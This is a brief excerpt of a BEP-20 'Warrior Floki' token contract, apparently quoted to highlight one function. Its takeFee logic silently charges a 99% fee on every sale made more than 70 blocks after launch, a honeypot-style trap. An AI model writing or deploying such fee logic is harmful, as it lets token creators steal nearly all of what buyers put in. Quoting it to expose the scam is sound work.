...
Telegram : https://t.me/WarriorFloki_Official
...
contract WarriorFloki is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Warrior Floki";
    string constant _symbol = "WarriorFloki";
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        ...
        } else if(isSell && (launchedAt + 70 < block.number)){
            feeAmount = amount.div(100).mul(99);
        }
